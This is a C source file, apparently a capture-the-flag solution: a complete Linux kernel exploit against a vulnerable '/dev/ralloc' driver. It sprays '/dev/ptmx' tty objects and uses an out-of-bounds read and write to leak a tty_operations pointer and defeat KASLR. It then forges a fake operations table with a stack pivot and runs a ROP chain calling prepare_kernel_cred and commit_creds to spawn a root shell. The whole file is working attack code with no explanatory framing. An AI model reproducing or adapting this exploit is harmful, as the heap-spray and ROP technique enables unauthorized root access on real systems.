#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <signal.h>
#include <sys/auxv.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/uio.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <assert.h>


#define IOCTL_NEW 0x1000
#define IOCTL_DEL 0x1001
#define IOCTL_WRITE 0x1002
#define IOCTL_READ 0x1003
#define ops_offset 0x10af6a0


int fd;

unsigned long int fake_stack;
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;
unsigned long saved[0x420];
int first = -1;

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :
        : "memory");
}





void perr(char * err){

	printf("%s",err);
	cleanup();
	exit(1);
}

struct arg {
	unsigned long int id;
	unsigned long int size;
	void * buff;
};

void inew(unsigned long int id,unsigned long int size){
	struct arg nn;
	nn.id = id;
	nn.size = size;
	int res = ioctl(fd,IOCTL_NEW,&nn);
	if(res<0) perr("[-] Kmalloc Failed\n");
	
}

void idel(unsigned long int id){
	struct arg nn;
	nn.id = id;
	int res = ioctl(fd,IOCTL_DEL,&nn);

}

void iwrite(unsigned long int id,unsigned long int size,char * buff){

	struct arg nn;
	nn.id = id;
	nn.size = size;
	nn.buff = buff;
	int res = ioctl(fd,IOCTL_WRITE,&nn);
	if(res < 0){ printf("id -> %d ",id);perr("[-] WRITE FAILED\n");}

}

void iread(unsigned long int id,unsigned long int size, char * buff){

	struct arg nn;
	nn.id = id;
	nn.size = size;
	nn.buff = buff;
	int res = ioctl(fd,IOCTL_READ,&nn);
	if(res < 0) perr("[-] READ FAILED");

}


void cleanup(){

	for(int i = 0 ; i<=30;++i){
		idel(i);
	}


}

long shell()
{
   iwrite(first,0x420,saved);
   puts("WE ARE UID = 0 :))");
   system("/bin/sh");
   return 0;
   
}

int ptmxarr[100];



struct tty_operations
{
    struct tty_struct *(*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */
    int (*install)(struct tty_driver *, struct tty_struct *);              /*     8     8 */
    void (*remove)(struct tty_driver *, struct tty_struct *);              /*    16     8 */
    int (*open)(struct tty_struct *, struct file *);                       /*    24     8 */
    void (*close)(struct tty_struct *, struct file *);                     /*    32     8 */
    void (*shutdown)(struct tty_struct *);                                 /*    40     8 */
    void (*cleanup)(struct tty_struct *);                                  /*    48     8 */
    int (*write)(struct tty_struct *, const unsigned char *, int);         /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    int (*put_char)(struct tty_struct *, unsigned char);                            /*    64     8 */
    void (*flush_chars)(struct tty_struct *);                                       /*    72     8 */
    int (*write_room)(struct tty_struct *);                                         /*    80     8 */
    int (*chars_in_buffer)(struct tty_struct *);                                    /*    88     8 */
    int (*ioctl)(struct tty_struct *, unsigned int, long unsigned int);             /*    96     8 */
    long int (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */
    void (*set_termios)(struct tty_struct *, struct ktermios *);                    /*   112     8 */
    void (*throttle)(struct tty_struct *);                                          /*   120     8 */
    /* --- cacheline 2 boundary (128 bytes) --- */
    void (*unthrottle)(struct tty_struct *);           /*   128     8 */
    void (*stop)(struct tty_struct *);                 /*   136     8 */
    void (*start)(struct tty_struct *);                /*   144     8 */
    void (*hangup)(struct tty_struct *);               /*   152     8 */
    int (*break_ctl)(struct tty_struct *, int);        /*   160     8 */
    void (*flush_buffer)(struct tty_struct *);         /*   168     8 */
    void (*set_ldisc)(struct tty_struct *);            /*   176     8 */
    void (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */
    /* --- cacheline 3 boundary (192 bytes) --- */
    void (*send_xchar)(struct tty_struct *, char);                           /*   192     8 */
    int (*tiocmget)(struct tty_struct *);                                    /*   200     8 */
    int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int);        /*   208     8 */
    int (*resize)(struct tty_struct *, struct winsize *);                    /*   216     8 */
    int (*set_termiox)(struct tty_struct *, struct termiox *);               /*   224     8 */
    int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */
    const struct file_operations *proc_fops;                                 /*   240     8 */

    /* size: 248, cachelines: 4, members: 31 */
    /* last cacheline: 56 bytes */
};


int main(){

	signal(SIGSEGV, shell);

	save_state();
	fd = open("/dev/ralloc",0);
	if(fd < 0) perr("[-] Failed to open FD\n");


	int cnt = 0;
	char  temp[0x400];
	memset(temp,0x41,sizeof(temp));

	for(int i = 0;i<50;++i){
	
	
		ptmxarr[i] = open("/dev/ptmx",O_RDWR|O_NOCTTY);
		if(i%3==0 && cnt<=10){        

			inew(cnt,0x400);
        		iwrite(cnt,0x400,temp);
			cnt++;
				
		}

		if(ptmxarr[i] < 0) perr("[-] Failed to open ptmx");
	}
	
	
	unsigned long buff[0x420];


	for(int i = 0;i<=10;++i){
		iread(i,0x420,buff);
		unsigned long int tt = buff[(0x400+0x18)/sizeof(unsigned long)];
		unsigned long int wtf = tt & 0xa0;
		unsigned long int high = tt >> 48;
		if(wtf == 0xa0 && high == 0xffff){
			first = i;
			printf("[+] Found Adjacent\n");
			break;
		}
		
	}

	if(first == -1 ){
			puts("Failed to find Adjacent");
			cleanup();
			return 0;
	}


	unsigned long int ops;
	ops = buff[(0x400+0x18)/sizeof(unsigned long)];
	printf("[+] ops -> 0x%16lx\n",ops);

	saved[(0x400)/sizeof(unsigned long)] = buff[(0x400)/sizeof(unsigned long)];
	saved[(0x400+8)/sizeof(unsigned long)] = buff[(0x400+8)/sizeof(unsigned long)];
	saved[(0x400+0x10)/sizeof(unsigned long)] = buff[(0x400+0x10)/sizeof(unsigned long)];
	saved[(0x400+0x18)/sizeof(unsigned long)] = buff[(0x400+0x18)/sizeof(unsigned long)];


	unsigned long int kbase = ops - ops_offset;
	printf("[+] kernel_base -> 0x%16lx\n",kbase);

	
	struct tty_operations *fake_tty_operations = (struct tty_operations *) malloc(sizeof(struct tty_operations));
	memset(fake_tty_operations, 0, sizeof(struct tty_operations));


	unsigned long int stack_pivot = kbase + 0x368c08;
	unsigned long int low_4 = stack_pivot & 0xffffffff;
	fake_stack = low_4 & ~0xfff;

	if (mmap(fake_stack, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) < 0) {
        perr("mmap");
        exit(1);
    	}


	unsigned long int pop_rdi_ret = kbase + 0x8b8a0;
	unsigned long int mov_cr4_rdi_pop_rbp_ret = kbase + 0x1fc40;
	unsigned long int swapgs_pop_rbp_ret = kbase + 0x74b54;
	unsigned long int iretq = kbase + 0x379fb;
	unsigned long int xchg_rax_rdi_ret = kbase + 0xc02394;
	unsigned long int swap_gs_pop_rbp_ret = kbase + 0x74b54;

	commit_creds = kbase+0xc0540;
	prepare_kernel_cred = kbase+0xc07a0;

	unsigned long fake_rbp = fake_stack + 0x9000;




	unsigned long ropchain[] = {
		pop_rdi_ret,
		0x0,
		prepare_kernel_cred,
		xchg_rax_rdi_ret,
		commit_creds,
		swap_gs_pop_rbp_ret,
		0xdeadbeef,
		iretq,
		shell,
		user_cs,
		user_rflags,
		user_sp,
		user_ss
		};


	memcpy((void *)low_4,ropchain,sizeof(ropchain));

	printf("[+] stack_pivot -> 0x%lx\n",stack_pivot);
	printf("[+] low_4_bytes -> 0x%lx\n",low_4);
	printf("[+] fake_stack -> 0x%lx\n",fake_stack);
	


	fake_tty_operations->ioctl = stack_pivot;
	buff[(0x400+0x18)/sizeof(unsigned long int)] = (unsigned long)fake_tty_operations;
	iwrite(first,0x420,buff);

	
	for(int i = 0;i<50;++i){

		ioctl(ptmxarr[i],0,0);
	}


	cleanup();

	

}
